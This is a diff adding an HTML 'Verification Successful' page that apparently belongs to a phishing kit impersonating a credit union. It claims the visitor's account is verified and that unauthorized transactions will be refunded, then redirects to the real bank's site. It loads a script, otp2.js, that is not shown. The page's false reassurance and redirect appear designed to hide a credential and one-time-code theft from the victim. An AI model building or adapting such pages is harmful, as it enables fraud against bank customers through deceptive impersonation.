@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OTP Verification</title>
+    <link rel="stylesheet" href="./style.css">
+    <style>
+        .check-mark-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 20px auto;
+        }
+
+        .check-mark-animation {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 4px solid #4CAF50;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .check-mark {
+            width: 25px;
+            height: 50px;
+            border-right: 4px solid #4CAF50;
+            border-bottom: 4px solid #4CAF50;
+            transform: rotate(45deg);
+            position: absolute;
+            opacity: 0;
+            animation: draw-check 2s infinite ease-in-out;
+        }
+
+        @keyframes draw-check {
+            0% {
+                opacity: 0;
+                transform: rotate(45deg) scale(0);
+            }
+            50% {
+                opacity: 1;
+                transform: rotate(45deg) scale(1.2);
+            }
+            100% {
+                opacity: 0;
+                transform: rotate(45deg) scale(0);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="mainContainer">
+        <form id="otpForm" class="form">
+            <img src="./logo.png" alt="">
+            <div class="contactHeader">
+                <h2>Verification Successful</h2>
+            </div>
+
+            <div class="check-mark-container">
+                <div class="check-mark-animation">
+                    <div class="check-mark"></div>
+                </div>
+            </div>
+
+            <p>Your account information has been successfully verified. All unauthorized transactions will be refunded within 2-5 business days. Please click on the sign-in button below to log in.</p>
+            <br>
+            <button type="button" onclick="window.location.href='https://campuscu.com/'">Sign In</button>
+<br>
+            <div class="footer">
+                <div class="f1">
+                    <p>Location</p>
+                </div>
+                <div class="f2">
+                    <p>Privacy Policy</p>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <script src="./otp2.js"></script>
+</body>
+
+</html>
